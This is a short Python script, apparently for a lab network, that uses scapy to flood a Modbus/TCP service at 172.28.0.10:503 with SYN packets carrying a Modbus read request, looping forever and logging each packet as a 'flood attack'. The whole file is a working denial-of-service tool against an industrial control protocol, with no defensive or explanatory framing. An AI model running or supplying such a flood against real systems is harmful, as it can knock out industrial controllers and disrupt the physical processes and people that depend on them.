from scapy.all import *
import random
import logging

logging.basicConfig(level=logging.INFO)


target_ip = "172.28.0.10"
target_port = 503


def create_modbus_packet():
    packet = Ether()/IP(dst=target_ip)/TCP(dport=target_port, sport=random.randint(1024, 65535), flags="S")
    modbus_data = b'\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01'
    return packet/Raw(load=modbus_data)


def flood_modbus():
    logging.info(f"Starting flood attack on {target_ip}:{target_port}")
    while True:
        packet = create_modbus_packet()
        send(packet, verbose=False)
        logging.info(f"Sent packet to {target_ip}:{target_port}")


flood_modbus()
